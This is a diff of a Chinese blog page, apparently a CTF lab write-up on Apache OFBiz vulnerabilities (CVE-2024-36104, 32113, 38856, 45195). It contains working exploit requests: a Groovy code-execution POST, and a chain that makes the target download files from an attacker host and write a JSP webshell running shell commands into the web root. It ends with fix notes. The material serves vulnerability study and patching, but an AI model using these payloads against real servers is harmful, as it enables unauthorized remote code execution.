@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>春秋云镜-Apache OFBiz路径遍历漏洞（CVE-2024-36104） | isum</title>
+  <title>春秋云镜-Apache OFBiz历史漏洞 | isum</title>
   <meta name="keywords" content=" groovy , 路径处理 ">
-  <meta name="description" content="春秋云镜-Apache OFBiz路径遍历漏洞（CVE-2024-36104） | isum">
+  <meta name="description" content="春秋云镜-Apache OFBiz历史漏洞 | isum">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="CVE-2024-36104✓CVE-2024-32113✓CVE-2024-38856✓   ​​CVE编号​​ ​​漏洞类型​​ ​​利用方式​​ ​​影响版本​​ ​​修复版本​​ ​​关键区别​​    ​​CVE-2024-32113​​ 路径遍历 → RCE 通过特殊字符（如;）绕过路径校验，访问受限接口 旧版本（未明确） 18.12.14+ ​​利用字符解析缺陷​​，非标准路径遍历">
 <meta property="og:type" content="article">
@@ -309,9 +309,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-春秋云镜-Apache-OFBiz路径遍历漏洞（CVE-2024-36104）" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-春秋云镜-Apache-OFBiz历史漏洞" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">春秋云镜-Apache OFBiz路径遍历漏洞（CVE-2024-36104）</h1>
+        <h1 class="article-title">春秋云镜-Apache OFBiz历史漏洞</h1>
     
     <div class="article-meta">
         
@@ -338,7 +338,7 @@
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2025-05-06 07:55:14'>2025-05-05 22:19</time>
+            发布时间 : <time class="date" title='最后更新: 2025-05-06 18:23:42'>2025-05-06 18:19</time>
         
     </div>
     <div class="article-meta">
@@ -371,7 +371,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-text">漏洞概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-text">漏洞影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-text">漏洞原理分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E2%80%8BOFBiz%E7%9A%84%E8%AF%B7%E6%B1%82%E8%B7%AF%E7%94%B1%E9%80%BB%E8%BE%91%E2%80%8B%E2%80%8B"><span class="toc-text">1. ​OFBiz的请求路由逻辑​​</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E2%80%8B%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E7%9A%84%E6%A0%B9%E6%9C%AC%E5%8E%9F%E5%9B%A0%E2%80%8B%E2%80%8B"><span class="toc-text">2. ​漏洞触发的根本原因​​</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E2%80%8B%E5%AE%98%E6%96%B9%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F%E9%AA%8C%E8%AF%81%E2%80%8B%E2%80%8B"><span class="toc-text">3.​官方修复方式验证​​</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E6%AD%A5%E9%AA%A4"><span class="toc-text">漏洞复现步骤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-text">修复建议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2024-36104%E2%9C%93"><span class="toc-text">CVE-2024-36104✓</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2024-32113%E2%9C%93"><span class="toc-text">CVE-2024-32113✓</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2024-38856%E2%9C%93"><span class="toc-text">CVE-2024-38856✓</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2024-45195"><span class="toc-text">CVE-2024-45195</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E6%A6%82%E8%BF%B0"><span class="toc-text">1、概述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E5%88%86%E6%9E%90"><span class="toc-text">2、分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81%E5%A4%8D%E7%8E%B0"><span class="toc-text">3、复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81%E4%BF%AE%E5%A4%8D"><span class="toc-text">4、修复</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -387,93 +387,134 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>Apache OFBiz是一款基于Java的企业资源计划（ERP）系统，广泛应用于电子商务领域。2024年6月披露的CVE-2024-36104漏洞允许攻击者通过路径遍历绕过身份验证，并利用Groovy脚本执行接口实现​远程代码执行（RCE）​。该漏洞影响Apache OFBiz 18.12.14之前的版本</p>
-<hr>
-<h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><ul>
-<li>​<strong>​受影响版本​</strong>​：Apache OFBiz &lt; 18.12.14</li>
-<li>​<strong>​FOFA搜索语法​</strong>​：<code>app=&quot;Apache_OFBiz&quot;</code></li>
-</ul>
-<hr>
-<h2 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h2><p>Apache OFBiz的​<strong>​请求路由机制设计缺陷​</strong><br>​</p>
-<h4 id="1-​OFBiz的请求路由逻辑​​"><a href="#1-​OFBiz的请求路由逻辑​​" class="headerlink" title="1. ​OFBiz的请求路由逻辑​​"></a>1. ​OFBiz的请求路由逻辑​​</h4><p>Apache OFBiz使用<code>ControlServlet</code>和<code>ControlFilter</code>处理请求路径，其路由规则如下：</p>
+        <img src="/2025/05/06/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Apache-OFBiz%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/1.png" class="">
+<h3 id="CVE-2024-36104✓"><a href="#CVE-2024-36104✓" class="headerlink" title="CVE-2024-36104✓"></a>CVE-2024-36104✓</h3><h3 id="CVE-2024-32113✓"><a href="#CVE-2024-32113✓" class="headerlink" title="CVE-2024-32113✓"></a>CVE-2024-32113✓</h3><h3 id="CVE-2024-38856✓"><a href="#CVE-2024-38856✓" class="headerlink" title="CVE-2024-38856✓"></a>CVE-2024-38856✓</h3><table>
+<thead>
+<tr>
+<th>​<strong>​CVE编号​</strong>​</th>
+<th>​<strong>​漏洞类型​</strong>​</th>
+<th>​<strong>​利用方式​</strong>​</th>
+<th>​<strong>​影响版本​</strong>​</th>
+<th>​<strong>​修复版本​</strong>​</th>
+<th>​<strong>​关键区别​</strong>​</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>​<strong>​CVE-2024-32113​</strong>​</td>
+<td>路径遍历 → RCE</td>
+<td>通过特殊字符（如<code>;</code>）绕过路径校验，访问受限接口</td>
+<td>旧版本（未明确）</td>
+<td>18.12.14+</td>
+<td>​<strong>​利用字符解析缺陷​</strong>​，非标准路径遍历</td>
+</tr>
+<tr>
+<td>​<strong>​CVE-2024-36104​</strong>​</td>
+<td>路径遍历 → RCE</td>
+<td>构造 <code>/forgotPassword/%2e%2e/ProgramExport</code> 路径绕过认证</td>
+<td>&lt; 18.12.14</td>
+<td>18.12.14+</td>
+<td>​<strong>​路径遍历技巧不同​</strong>​，但最终触发点相同</td>
+</tr>
+<tr>
+<td>​<strong>​CVE-2024-38856​</strong>​</td>
+<td>认证绕过 → RCE</td>
+<td>通过 <code>/forgotPassword</code> 绕过权限，调用 <code>ProgramExport</code> 执行Groovy代码</td>
+<td>&lt; 18.12.14</td>
+<td>18.12.14+</td>
+<td>​<strong>​直接利用Groovy接口​</strong>​，无需文件写入</td>
+</tr>
+<tr>
+<td>​<strong>​CVE-2024-45195​</strong>​</td>
+<td>SSRF → 文件写入 → RCE</td>
+<td>通过 <code>viewdatafile</code> 接口远程加载恶意CSV&#x2F;XML，写入JSP木马</td>
+<td>&lt; 18.12.16</td>
+<td>18.12.16+</td>
+<td>​<strong>​需文件写入+Web目录访问​</strong>​，利用链更长</td>
+</tr>
+</tbody></table>
+<h3 id="CVE-2024-45195"><a href="#CVE-2024-45195" class="headerlink" title="CVE-2024-45195"></a>CVE-2024-45195</h3><h4 id="1、概述"><a href="#1、概述" class="headerlink" title="1、概述"></a>1、概述</h4><p>该漏洞是由于之前漏洞（CVE-2024-32113、CVE-2024-36104 和 CVE-2024-38856）未完全修复所导致。在 Apache OFBiz 版本 18.12.16 之前，开发人员对这些先前的问题进行了修复，但控制器视图地图状态不同步的根本问题仍然存在。这使得攻击者能够绕过身份验证并访问敏感的仅限管理员的视图地图。</p>
+<p><strong>影响范围​</strong>​：</p>
 <ul>
-<li>默认情况下，请求路径会被解析为：<code>/webtools/control/&lt;endpoint&gt;</code>，其中<code>&lt;endpoint&gt;</code>对应<code>controller.xml</code>中定义的接口。</li>
-<li>关键问题​：OFBiz的路径解析逻辑​<strong>​未严格校验路径层级​</strong>​，导致以下两种请求会被视为等效：<ul>
-<li>合法路径：<code>/webtools/control/ProgramExport</code></li>
-<li>嵌套路径：<code>/webtools/control/forgotPassword/ProgramExport</code></li>
+<li>Apache OFBiz 版本 &lt; 18.12.16</li>
+<li>涉及功能模块：<code>/webtools/control/viewdatafile</code> 接口</li>
 </ul>
-</li>
-</ul>
-<h4 id="2-​漏洞触发的根本原因​​"><a href="#2-​漏洞触发的根本原因​​" class="headerlink" title="2. ​漏洞触发的根本原因​​"></a>2. ​漏洞触发的根本原因​​</h4><p>（1）​<strong>​接口权限控制失效​</strong>​</p>
-<ul>
-<li><code>forgotPassword</code>是公开接口（无需认证），而<code>ProgramExport</code>是需认证的高危接口。</li>
-<li>由于路由逻辑缺陷，当用户访问<code>/forgotPassword/ProgramExport</code>时：<ul>
-<li>​<strong>​权限检查​</strong>​：系统首先检查<code>forgotPassword</code>的权限（允许访问）。</li>
-<li>​<strong>​路由映射​</strong>​：后续路径<code>ProgramExport</code>被错误地当作子接口处理，绕过了对<code>ProgramExport</code>本身的权限校验。</li>
-</ul>
-</li>
-</ul>
-<p>（2）​<strong>​路径遍历的“简化版”​</strong>​</p>
-<ul>
-<li>漏洞利用中使用的<code>%2e</code>（<code>.</code>的URL编码）是显式的路径遍历（<code>/forgotPassword/%2e/%2e/ProgramExport</code>等价于<code>/ProgramExport</code>）。</li>
-<li>&#x2F;webtools&#x2F;control&#x2F;forgotPassword;&#x2F;ProgramExport</li>
-<li>但直接访问<code>/forgotPassword/ProgramExport</code>能成功，是因为OFBiz的​<strong>​路由逻辑自动忽略了中间路径​</strong>​，本质上与路径遍历效果相同。</li>
-</ul>
-<h4 id="3-​官方修复方式验证​​"><a href="#3-​官方修复方式验证​​" class="headerlink" title="3.​官方修复方式验证​​"></a>3.​官方修复方式验证​​</h4><p>在Apache OFBiz 18.12.14版本中，官方通过以下方式修复：</p>
+<h4 id="2、分析"><a href="#2、分析" class="headerlink" title="2、分析"></a>2、分析</h4><p><strong>漏洞成因​</strong>​：</p>
 <ol>
-<li>​<strong>​严格路径校验​</strong>​：要求请求路径必须精确匹配<code>controller.xml</code>中定义的接口，禁止多级路径嵌套。</li>
-<li>​<strong>​显式权限控制​</strong>​：对<code>ProgramExport</code>等敏感接口强制二次鉴权。</li>
+<li>​<strong>​权限绕过​</strong>​：<br> Apache OFBiz 在处理 <code>/viewdatafile</code> 接口时，未对请求路径进行严格的权限校验。攻击者可通过构造包含 <code>/forgotPassword</code> 等公开接口的 URL（如 <code>/webtools/control/forgotPassword/viewdatafile</code>），绕过身份验证机制</li>
+<li>​<strong>​文件写入逻辑缺陷​</strong>​：<br> 该接口允许通过参数 <code>DATAFILE_SAVE</code> 指定文件保存路径，并通过 <code>DATAFILE_LOCATION</code> 和 <code>DEFINITION_LOCATION</code> 远程加载恶意 CSV&#x2F;JSP 和 XML 配置文件。攻击者可利用此功能将木马写入 Web 目录（如 <code>./applications/accounting/webapp/accounting/index.jsp</code>）</li>
+<li>​<strong>​动态脚本执行​</strong>​：<br> 写入的 JSP 文件会被 Apache Tomcat 解析，攻击者通过 URL 参数（如 <code>?cmd=calc</code>）触发命令执行</li>
 </ol>
-<hr>
-<h2 id="漏洞复现步骤"><a href="#漏洞复现步骤" class="headerlink" title="漏洞复现步骤"></a>漏洞复现步骤</h2><p>1、访问<a target="_blank" rel="noopener" href="https://ip:8443/accounting">https://ip:8443/accounting</a><br>非本地 localhost 启动，修改请求体Host为localhost才能正常访问</p>
-<img src="/2025/05/05/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Apache-OFBiz%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2024-36104%EF%BC%89/1.png" class="">
-<img src="/2025/05/05/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Apache-OFBiz%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2024-36104%EF%BC%89/2.png" class="">
-
-<p>2、请求&#x2F;webtools&#x2F;control&#x2F;forgotPassword&#x2F;ProgramExport接口，执行代码</p>
-<pre><code class="groovy">-- groovy
-throw new Exception(&#39;cat /flag&#39;.execute().text);
-
--- unicode
-\u0074\u0068\u0072\u006f\u0077\u0020\u006e\u0065\u0077\u0020\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0028\u0027\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067\u0027\u002e\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0029\u002e\u0074\u0065\u0078\u0074\u0029\u003b
+<h4 id="3、复现"><a href="#3、复现" class="headerlink" title="3、复现"></a>3、复现</h4><p>(1)、在服务器 <code>&lt;attacker-ip&gt;</code> 上部署恶意 XML 文件和 CSV 文件</p>
+<p>第一个文件是 <code>rceschema.xml</code>，此 XML schema 文件定义了恶意 JSP 的结构：</p>
+<pre><code class="xml">&lt;data-files xsi:noNamespaceSchemaLocation=&quot;http://ofbiz.apache.org/dtds/datafiles.xsd&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&gt;
+    &lt;data-file name=&quot;rce&quot; separator-style=&quot;fixed-length&quot; type-code=&quot;text&quot; start-line=&quot;0&quot; encoding-type=&quot;UTF-8&quot;&gt;
+        &lt;record name=&quot;rceentry&quot; limit=&quot;many&quot;&gt;
+            &lt;field name=&quot;jsp&quot; type=&quot;String&quot; length=&quot;605&quot; position=&quot;0&quot;&gt;&lt;/field&gt;
+        &lt;/record&gt;
+    &lt;/data-file&gt;
+&lt;/data-files&gt;
 </code></pre>
-<pre><code class="http">POST /webtools/control/forgotPassword/ProgramExport HTTP/1.1
-Host: localhost:36646
-Cookie: JSESSIONID=2A2143A74051B80F86479CE4543B034E.jvm1; OFBiz.Visitor=10000
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OpenWave/93.4.3797.32
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Accept-Encoding: gzip, deflate, br
-Upgrade-Insecure-Requests: 1
-Sec-Fetch-Dest: document
-Sec-Fetch-Mode: navigate
-Sec-Fetch-Site: none
-Sec-Fetch-User: ?1
-Sec-Ch-Ua-Platform: &quot;Windows&quot;
-Sec-Ch-Ua: &quot;Google Chrome&quot;;v=&quot;125&quot;, &quot;Chromium&quot;;v=&quot;125&quot;, &quot;Not=A?Brand&quot;;v=&quot;24&quot;
-Sec-Ch-Ua-Mobile: ?0
-Priority: u=0, i
-Te: trailers
-Connection: close
+<p>第二个文件是 <code>rcereport.csv</code>，此 CSV 文件包含实际的 JSP 代码：</p>
+<pre><code class="csv">&lt;%@ page import=&#39;java.io.*&#39; %&gt;&lt;%@ page import=&#39;java.util.*&#39; %&gt;&lt;h1&gt;Ahoy!&lt;/h1&gt;&lt;br&gt;&lt;% String getcmd = request.getParameter(&quot;cmd&quot;); if (getcmd != null) &#123; out.println(&quot;Command: &quot; + getcmd + &quot;&lt;br&gt;&quot;); String cmd1 = &quot;/bin/sh&quot;; String cmd2 = &quot;-c&quot;; String cmd3 = getcmd; String[] cmd = new String[3]; cmd[0] = cmd1; cmd[1] = cmd2; cmd[2] = cmd3; Process p = Runtime.getRuntime().exec(cmd); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) &#123; out.println(disr); disr = dis.readLine();&#125;&#125; %&gt;,
+</code></pre>
+<p>启动Python内置HTTP服务器</p>
+<pre><code class="bash"># 进入文件所在目录
+cd /path/to/files
+
+# 启动Python HTTP服务（默认端口8000）
+python3 -m http.server 8000
+
+sudo ufw allow 8000/tcp 
+</code></pre>
+<p>(2)、发送请求<br>该请求通过利用 viewdatafile 视图地图将恶意 JSP 文件写入 Web 根目录，从而利用了该漏洞实现远程代码执行。</p>
+<pre><code class="http">POST /webtools/control/forgotPassword/viewdatafile HTTP/1.1
+Host: localhost:34583
+User-Agent: curl/7.81.0
+Accept: */*
+Content-Length: 241
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 306
 
-groovyProgram=\u0074\u0068\u0072\u006f\u0077\u0020\u006e\u0065\u0077\u0020\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0028\u0027\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067\u0027\u002e\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0029\u002e\u0074\u0065\u0078\u0074\u0029\u003b
-
+DATAFILE_LOCATION=http://&lt;attacker-ip&gt;/rcereport.csv&amp;DATAFILE_SAVE=./applications/accounting/webapp/accounting/index.jsp&amp;DATAFILE_IS_URL=true&amp;DEFINITION_LOCATION=http://&lt;attacker-ip&gt;/rceschema.xml&amp;DEFINITION_IS_URL=true&amp;DEFINITION_NAME=rce
 </code></pre>
-<img src="/2025/05/05/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Apache-OFBiz%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2024-36104%EF%BC%89/3.png" class="">
+<p>(3)、执行任意命令<br>在 JSP webshell 被写入后，通过 &#96;<a target="_blank" rel="noopener" href="https://39.106.48.123:34583/accounting/index.jsp?cmd=cat">https://39.106.48.123:34583/accounting/index.jsp?cmd=cat</a> &#x2F;flag </p>
+<img src="/2025/05/06/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Apache-OFBiz%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/2.png" class="">
 
-<hr>
-<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><ol>
-<li>​<strong>​官方补丁​</strong>​：升级至Apache OFBiz 18.12.14或更高版本</li>
-<li>​<strong>​临时缓解措施​</strong>​：<ul>
-<li>禁用<code>webtools</code>模块的非必要接口。</li>
-<li>配置Web应用防火墙（WAF）拦截包含<code>%2e</code>或<code>;</code>的恶意请求。</li>
+<h4 id="4、修复"><a href="#4、修复" class="headerlink" title="4、修复"></a>4、修复</h4><p>官方修复的核心改动​：</p>
+<p>​(1) 权限校验强化​</p>
+<ul>
+<li>​<strong>​问题根源​</strong>​：原漏洞利用路径 <code>/webtools/control/forgotPassword/viewdatafile</code> 通过嵌套公开接口（<code>forgotPassword</code>）绕过权限检查。</li>
+<li>​<strong>​修复方式​</strong>​：<br>  在 <code>ControlFilter.java</code> 中修改请求路由逻辑，​<strong>​强制要求精确匹配控制器定义的接口路径​</strong>​，禁止通过路径遍历（如 <code>/forgotPassword/../viewdatafile</code>）访问受限接口。</li>
+</ul>
+<pre><code class="java">// 修复前：松散匹配路径
+if (requestUri.contains(&quot;viewdatafile&quot;)) &#123; /* 执行逻辑 */ &#125;
+
+// 修复后：严格校验完整路径
+if (requestUri.equals(&quot;/webtools/control/viewdatafile&quot;)) &#123; /* 执行逻辑 */ &#125;
+</code></pre>
+<p>​<br>(2) 文件写入限制​​</p>
+<ul>
+<li>​<strong>​问题根源​</strong>​：<code>viewdatafile</code> 接口允许通过 <code>DATAFILE_LOCATION</code> 参数加载远程文件并写入任意路径。</li>
+<li>​<strong>​修复方式​</strong>​：<ul>
+<li>移除通过 URL 加载外部文件的功能（<code>DATAFILE_IS_URL</code> 和 <code>DEFINITION_IS_URL</code> 参数失效）。</li>
+<li>限制文件保存路径必须在安全目录内（如临时目录），禁止写入 Web 根目录。</li>
 </ul>
 </li>
-<li>​<strong>​输入过滤​</strong>​：对<code>groovyProgram</code>参数实施白名单校验，禁止异常字符。</li>
-</ol>
+</ul>
+<pre><code class="java">// 修复后代码片段（FileUtil.java）
+if (savePath.contains(&quot;webapp&quot;)) &#123;
+    throw new SecurityException(&quot;禁止写入Web目录&quot;);
+&#125;
+</code></pre>
+<p>​(3) 输入参数过滤​​</p>
+<ul>
+<li>​<strong>​问题根源​</strong>​：未对 <code>DATAFILE_SAVE</code> 和 <code>DEFINITION_LOCATION</code> 参数进行过滤。</li>
+<li>​<strong>​修复方式​</strong>​：<br>  增加对参数内容的黑名单校验，禁止包含 <code>../</code>、<code>WEB-INF</code>、<code>webapp</code> 等敏感路径：</li>
+</ul>
+<pre><code class="java">if (parameterValue.matches(&quot;.*(\\.\\./|WEB-INF|webapp).*&quot;)) &#123;
+    throw new SecurityException(&quot;非法路径参数&quot;);
+&#125;
+</code></pre>
 <hr>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>CVE-2024-36104暴露了Apache OFBiz在路径处理和接口权限设计上的严重缺陷。通过本次复现可看出，攻击者仅需构造简单请求即可实现未授权RCE，威胁等级极高。企业需及时修复漏洞，并加强对外部组件的安全审计。</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 梦里小镇落雨，开花，起风，挂霜，甚至扬起烤红薯的香气，每个墙角都能听见人们的说笑声。 </span>
